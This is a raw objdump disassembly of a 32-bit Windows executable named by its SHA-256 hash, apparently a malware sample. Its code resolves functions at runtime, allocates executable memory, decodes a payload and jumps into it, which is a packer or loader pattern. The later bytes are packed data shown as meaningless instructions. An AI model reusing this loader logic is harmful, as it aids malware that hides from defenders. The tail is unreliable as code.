
818b8693af7fb7c66079a4df0d795d929f228d12bc2712a2128956d63a773fa9.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0x667ab742
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	adc    BYTE PTR [edi+0x45],0xb
  4114af:	(bad)  
  4114b0:	stc    
  4114b1:	imul   DWORD PTR [eax-0x33a5d4fe]
  4114b7:	pop    edi
  4114b8:	add    eax,0x96f04c9f
  4114bd:	or     DWORD PTR [edi],0x33
  4114c0:	sub    BYTE PTR [ecx],ah
  4114c2:	mov    edx,0xd99edac7
  4114c7:	xchg   esi,eax
  4114c8:	jg     0x411538
  4114ca:	inc    edx
  4114cb:	adc    dh,bl
  4114cd:	push   eax
  4114ce:	test   BYTE PTR [esi],bh
  4114d0:	push   esi
  4114d1:	and    eax,0xdcbfa841
  4114d6:	push   0x15
  4114d8:	jne    0x4114ce
  4114da:	das    
  4114db:	hlt    
  4114dc:	pop    ss
  4114dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114de:	jg     0x411495
  4114e0:	cmc    
  4114e1:	hlt    
  4114e2:	xchg   ebx,eax
  4114e3:	push   0x8e46ace3
  4114e8:	adc    eax,0xbdfa3a21
  4114ed:	xor    eax,0x499aba5
  4114f2:	xor    eax,DWORD PTR [eax+edx*8+0x17]
  4114f6:	aaa    
  4114f7:	xlat   BYTE PTR ds:[ebx]
  4114f8:	add    BYTE PTR [ecx],ch
  4114fa:	pop    ebp
  4114fb:	test   BYTE PTR [ebp+0x67],0xa
  4114ff:	mov    ds:0xbbd89af4,al
  411504:	cmp    dl,dh
  411506:	sahf   
  411507:	popf   
  411508:	sub    eax,0xbb7c2810
  41150d:	in     al,0xd0
  41150f:	cli    
  411510:	cmp    eax,0x128084
  411515:	sbb    eax,0xc13da547
  41151a:	mov    bl,0xc8
  41151c:	(bad)  
  41151d:	mov    esp,0x3a28eb39
  411522:	loopne 0x411509
  411524:	out    0xaa,eax
  411526:	cmp    al,0xaf
  411528:	ins    BYTE PTR es:[edi],dx
  411529:	push   cs
  41152a:	jbe    0x411509
  41152c:	mov    al,ds:0xa4f1f10d
  411531:	push   0x48cb0161
  411536:	fucomi st,st(3)
  411538:	out    dx,eax
  411539:	outs   dx,DWORD PTR ds:[esi]
  41153a:	fldenv [eax-0xe84a1ab]
  411540:	pop    ds
  411541:	mov    ds:0x34bbd12,eax
  411546:	(bad)  
  411547:	jp     0x4114e2
  411549:	push   ebx
  41154a:	mov    edx,0x35263141
  41154f:	enter  0x403a,0xd5
  411553:	ds pop ss
  411555:	jbe    0x411545
  411557:	loope  0x411574
  411559:	adc    al,0x42
  41155b:	sbb    eax,0x8d67cb27
  411560:	mov    al,0xa4
  411562:	xchg   edx,eax
  411563:	mov    edi,0x7988bb67
  411568:	jmp    0xd95d:0xb94e87ec
  41156f:	push   ds
  411570:	jge    0x4114fc
  411572:	xor    BYTE PTR ds:0x27810214,ch
  411578:	fisttp WORD PTR [eax]
  41157a:	mov    ebx,?
  41157c:	and    BYTE PTR [ebp-0x55b9033a],dl
  411582:	shl    BYTE PTR [edx+0x3d],0x6d
  411586:	pop    edi
  411587:	lds    ecx,FWORD PTR [edi-0x2d]
  41158a:	test   ebx,ebp
  41158c:	cmp    BYTE PTR [eax+0x545018b2],0x94
  411593:	mov    esp,0x185441e5
  411598:	mov    DWORD PTR [esi+0x4e],ebx
  41159b:	jno    0x4115c4
  41159d:	pop    esp
  41159e:	mov    BYTE PTR [ebx-0x58],0xce
  4115a2:	outs   dx,BYTE PTR ds:[esi]
  4115a3:	mov    fs,WORD PTR [ebp-0x15]
  4115a6:	mov    bh,0x56
  4115a8:	scas   eax,DWORD PTR es:[edi]
  4115a9:	xor    al,0xd4
  4115ab:	popf   
  4115ac:	call   0xadcb:0xefae22d4
  4115b3:	outs   dx,DWORD PTR ds:[esi]
  4115b4:	xchg   esp,eax
  4115b5:	push   ebp
  4115b6:	scas   eax,DWORD PTR es:[edi]
  4115b7:	addr16 in eax,0x33
  4115ba:	sbb    al,0xc7
  4115bc:	es jecxz 0x41157a
  4115bf:	(bad)  
  4115c0:	mov    eax,0x59f88dca
  4115c5:	icebp  
  4115c6:	fcomp  QWORD PTR [ebp-0x31]
  4115c9:	loop   0x4115de
  4115cb:	stos   BYTE PTR es:[edi],al
  4115cc:	inc    ecx
  4115cd:	sub    al,0xe1
  4115d0:	mov    edx,0x64da0cee
  4115d5:	jg     0x4115cf
  4115d7:	loop   0x41155f
  4115d9:	retf   0x7497
  4115dc:	call   0x815b:0x87532347
  4115e3:	push   0x4c
  4115e5:	retf   
  4115e6:	test   al,0xd5
  4115e8:	imul   esi,DWORD PTR [edx],0xebf1dc31
  4115ee:	jns    0x411645
  4115f0:	sbb    al,0xb0
  4115f2:	add    BYTE PTR [esi+0x44],dl
  4115f5:	adc    ebx,DWORD PTR [ebx-0x6b]
  4115f8:	cmp    al,0x19
  4115fa:	aaa    
  4115fb:	cli    
  4115fc:	cld    
  4115fd:	adc    ah,BYTE PTR [edx]
  4115ff:	daa    
  411600:	sti    
  411601:	inc    ebp
  411602:	pushf  
  411603:	jl     0x4115ca
  411605:	push   esi
  411606:	ret    0xf559
  411609:	fistp  WORD PTR [edi]
  41160b:	fdiv   QWORD PTR [ecx]
  41160d:	mov    dh,0x1a
  41160f:	cwde   
  411610:	repz fs or edx,eax
  411614:	pop    eax
  411615:	jno    0x411671
  411617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411618:	aad    0xbb
  41161a:	test   BYTE PTR [ecx-0x1a],al
  41161d:	lea    ecx,[eax-0x3b4f0794]
  411623:	and    ecx,esi
  411625:	xchg   ecx,eax
  411626:	stos   DWORD PTR es:[edi],eax
  411627:	mov    DWORD PTR [edx],esi
  411629:	inc    esi
  41162a:	jns    0x4115ef
  41162c:	xor    ebp,DWORD PTR [esi]
  41162e:	popf   
  41162f:	retf   0x92cc
  411632:	fwait
  411633:	cmp    eax,0xb8d99b7f
  411638:	fwait
  411639:	pop    esi
  41163a:	addr16 mov al,ds:0x2131
  41163e:	fscale 
  411640:	or     edx,DWORD PTR [edx]
  411642:	add    ecx,DWORD PTR [edx+0x13]
  411645:	scas   al,BYTE PTR es:[edi]
  411646:	sub    eax,0x25548459
  41164b:	shr    DWORD PTR [ebp-0x5f5dd197],0xd1
  411652:	mov    ah,0x42
  411654:	jne    0x41168f
  411656:	imul   esi,esp,0x942c864c
  41165c:	mov    eax,ds:0xca61ceed
  411661:	fldenv [edx+0x24]
  411664:	cmp    eax,0xa7932c2a
  411669:	popa   
  41166a:	(bad)  
  41166b:	push   esi
  41166c:	mov    cl,0x1f
  41166e:	mov    eax,0x4f6c631e
  411673:	sub    al,BYTE PTR ds:0x76a8da72
  411679:	pop    esp
  41167a:	aas    
  41167b:	lea    ebp,[esi-0x17]
  41167e:	mov    edx,DWORD PTR [ecx-0x32]
  411681:	pop    esp
  411682:	add    esp,DWORD PTR ds:0xf14bed5f
  411688:	and    BYTE PTR [ebp-0x73],cl
  41168b:	cmp    edx,DWORD PTR [edi]
  41168d:	sbb    eax,0xac91f360
  411692:	out    dx,al
  411693:	mov    ds:0x370fa996,al
  411698:	pop    ebp
  411699:	xchg   ebx,eax
  41169a:	loope  0x41163b
  41169c:	sub    eax,0xad4b436
  4116a1:	cmp    DWORD PTR [edx],ebp
  4116a3:	test   BYTE PTR [edx+0xc],bh
  4116a6:	push   esi
  4116a7:	hlt    
  4116a8:	mov    bl,cl
  4116aa:	cmp    edx,DWORD PTR [eax-0x14e1eb6]
  4116b0:	dec    cl
  4116b2:	inc    esi
  4116b3:	cmovbe eax,DWORD PTR ds:0x69fd3259
  4116ba:	push   esi
  4116bb:	fdiv   DWORD PTR ds:0x3dbc240e
  4116c1:	mov    al,dh
  4116c3:	and    al,0x34
  4116c5:	scas   al,BYTE PTR es:[edi]
  4116c6:	neg    BYTE PTR [ecx]
  4116c8:	mov    DWORD PTR [esi-0x20],0x2912ff67
  4116cf:	and    DWORD PTR [ebx],0x64
  4116d2:	or     BYTE PTR ds:0x30b0f7dd,dl
  4116d8:	and    al,0x17
  4116da:	mov    cl,BYTE PTR [edi+0x2c80aede]
  4116e0:	jns    0x4116b6
  4116e2:	scas   eax,DWORD PTR es:[edi]
  4116e3:	ffreep st(4)
  4116e5:	out    dx,eax
  4116e6:	fcmovu st,st(4)
  4116e8:	out    dx,eax
  4116e9:	xchg   esi,eax
  4116ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116eb:	and    ebx,DWORD PTR [esi+0x72c268de]
  4116f1:	aaa    
  4116f2:	inc    edi
  4116f3:	in     al,dx
  4116f4:	pop    es
  4116f5:	scas   al,BYTE PTR es:[edi]
  4116f6:	popa   
  4116f7:	outs   dx,DWORD PTR ds:[esi]
  4116f8:	call   0x9b3e886b
  4116fd:	xchg   edx,eax
  4116fe:	and    cl,ah
  411700:	xchg   edx,eax
  411701:	lock in al,0xa2
  411704:	sbb    eax,0x38048895
  411709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41170a:	add    BYTE PTR [ebp+eiz*2+0x1a973192],0xc9
  411712:	lock push edi
  411714:	cmc    
  411715:	pop    ecx
  411716:	imul   ebp,DWORD PTR [eax+ecx*1],0x41
  41171a:	dec    edi
  41171b:	ss sbb eax,0x38722c1e
  411722:	push   esp
  411723:	pop    edx
  411724:	ss cli 
  411726:	push   ebx
  411727:	and    al,0x8d
  411729:	push   cs
  41172a:	or     ch,BYTE PTR [ebp+0x262c2fb6]
  411730:	cmp    BYTE PTR [ebx-0x16e79a27],dl
  411736:	aaa    
  411737:	sbb    eax,0x89a046d2
  41173c:	aad    0xda
  41173e:	ror    al,1
  411740:	clc    
  411741:	rcl    esi,1
  411743:	sub    ebx,ecx
  411745:	(bad)  
  411746:	sahf   
  411747:	cs sbb ebp,eax
  41174a:	mov    eax,0xa6327392
  41174f:	out    0xa4,al
  411751:	add    ebx,ecx
  411753:	aas    
  411754:	sbb    eax,eax
  411756:	pop    ss
  411757:	add    edx,DWORD PTR [edi]
  411759:	xor    cl,ch
  41175b:	lock add eax,0x55656fac
  411761:	hlt    
  411762:	stc    
  411763:	sub    BYTE PTR cs:[edx-0x5422bdb0],cl
  41176a:	adc    eax,0x48c47aa2
  41176f:	inc    ebx
  411770:	repz test al,0xc9
  411773:	les    esi,FWORD PTR [esi-0x42aee8ea]
  411779:	pop    ecx
  41177a:	add    BYTE PTR [edi],dh
  41177c:	fnstenv [ebx-0x12c9f7e1]
  411782:	pop    edi
  411783:	data16 sti 
  411785:	and    edx,DWORD PTR [eax]
  411787:	(bad)  
  411788:	dec    edi
  411789:	jmp    0x19ec1e86
  41178e:	das    
  41178f:	sbb    BYTE PTR [ebx+0x2b],al
  411792:	in     eax,0xc3
  411794:	pop    ecx
  411795:	sub    edx,DWORD PTR [edx+ebp*4]
  411798:	add    eax,0x2bcd7354
  41179d:	cmp    esi,DWORD PTR [eax]
  41179f:	iret   
  4117a0:	add    bh,ch
  4117a2:	(bad)  
  4117a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117a5:	pushf  
  4117a6:	lods   al,BYTE PTR ds:[esi]
  4117a7:	add    esi,DWORD PTR ds:[eax-0x34]
  4117ab:	inc    ebx
  4117ac:	stos   DWORD PTR es:[edi],eax
  4117ad:	scas   al,BYTE PTR es:[edi]
  4117ae:	sbb    dh,0xa3
  4117b1:	rcr    BYTE PTR [ecx+esi*4],0x38
  4117b5:	ins    BYTE PTR es:[edi],dx
  4117b6:	arpl   WORD PTR [esi+0x29],si
  4117b9:	loop   0x4117a2
  4117bb:	mov    es,WORD PTR [esi+0x50]
  4117be:	call   0x80804644
  4117c3:	fist   WORD PTR [edx-0x54b3f3f7]
  4117c9:	dec    edx
  4117ca:	(bad)  
  4117cb:	cmp    esi,edi
  4117cd:	and    eax,0xb2ea3656
  4117d2:	jmp    0x43028a7
  4117d7:	dec    esi
  4117d8:	fisubr DWORD PTR [edx-0x5a0a2a1f]
  4117de:	ror    BYTE PTR [ecx+0x365f01b6],1
  4117e4:	xor    eax,0x449378b0
  4117e9:	and    BYTE PTR [ebx-0x180b52b0],dh
  4117ef:	sub    DWORD PTR [edi],0xd40b4b8c
  4117f5:	and    edx,edx
  4117f7:	sbb    al,0x88
  4117f9:	mov    ebx,0xf0df2553
  4117fe:	retf   
  4117ff:	mov    dl,0xc
  411801:	or     ebp,DWORD PTR [eax]
  411803:	arpl   WORD PTR cs:[eax+esi*8-0x57d3095a],bx
  41180b:	jae    0x41178d
  41180d:	mov    ecx,0x8348b7a
  411812:	mov    ds:0x20e8d98f,al
  411817:	mov    BYTE PTR [ecx*4-0x2516777c],bl
  41181e:	(bad)  
  41181f:	retf   
  411820:	aad    0x12
  411822:	imul   ebp
  411824:	jg     0x411824
  411826:	fisub  DWORD PTR [ebx-0x25]
  411829:	cmp    BYTE PTR [ecx+0x58cc86d],dh
  41182f:	and    al,0x1b
  411831:	or     esp,DWORD PTR [ebp+0x19]
  411834:	repz sub DWORD PTR ss:[ebp-0x58],0xffffffda
  41183a:	dec    ebp
  41183b:	rcr    BYTE PTR [ecx-0x6848e783],cl
  411841:	jae    0x4118ba
  411843:	mov    al,0x8c
  411845:	cmp    dh,0xbc
  411848:	fsub   QWORD PTR [edx-0x49]
  41184b:	idiv   BYTE PTR [eax+0x2d8aaaf5]
  411851:	mov    ah,0x3e
  411853:	xor    al,0x52
  411855:	dec    eax
  411856:	xor    ch,al
  411858:	pop    ds
  411859:	adc    BYTE PTR [ebp-0x6a841460],0x5
  411860:	jge    0x4117f8
  411862:	imul   eax,DWORD PTR [edx-0x5fc17ef3],0xfaeb9457
  41186c:	stos   DWORD PTR es:[edi],eax
  41186d:	bnd call 0xbf383631
  411873:	pop    es
  411874:	bound  esp,QWORD PTR [edx+0x68]
  411877:	cli    
  411878:	enter  0xe087,0x50
  41187c:	repnz cmc 
  41187e:	sahf   
  41187f:	xlat   BYTE PTR ds:[ebx]
  411880:	jnp    0x411852
  411882:	icebp  
  411883:	cld    
  411884:	outs   dx,DWORD PTR ds:[esi]
  411885:	add    eax,0x9f74866f
  41188a:	add    al,0x7b
  41188c:	jle    0x411812
  41188e:	sub    DWORD PTR [esi+0x32bc801b],ebx
  411894:	mov    dl,0x26
  411896:	out    0x33,eax
  411898:	jl     0x4118a6
  41189a:	out    dx,eax
  41189b:	sbb    eax,0x3cc505f1
  4118a0:	mov    ebp,0xda814e5d
  4118a5:	mov    fs,WORD PTR [edi+0x7fc54b16]
  4118ab:	mov    bh,BYTE PTR [edx+0x22]
  4118ae:	(bad)  
  4118b0:	cmc    
  4118b1:	in     eax,0xc5
  4118b3:	push   eax
  4118b4:	mov    DWORD PTR [ecx+eiz*2+0x7b],edx
  4118b8:	pop    edx
  4118b9:	jle    0x411842
  4118bb:	bswap  esi
  4118bd:	or     al,cl
  4118bf:	mov    cs,WORD PTR [ebx+esi*1+0x4e]
  4118c3:	sub    BYTE PTR [ebp-0x6fb8b6ce],ch
  4118c9:	lea    edi,[edx+0x5cf6b42f]
  4118cf:	jbe    0x411888
  4118d1:	inc    edi
  4118d2:	cmp    BYTE PTR [edx],bh
  4118d4:	cld    
  4118d5:	test   eax,ebx
  4118d7:	push   esp
  4118d8:	mov    ch,0xb5
  4118da:	loopne 0x411942
  4118dc:	aaa    
  4118dd:	call   0xb692:0xb7c9a75b
  4118e4:	test   al,0xd7
  4118e6:	psubq  mm1,QWORD PTR [ebx+0x5]
  4118ea:	ins    BYTE PTR es:[edi],dx
  4118eb:	sbb    ebp,eax
  4118ed:	adc    eax,0x60dae4d4
  4118f2:	aad    0xa7
  4118f4:	inc    eax
  4118f5:	lods   al,BYTE PTR ds:[esi]
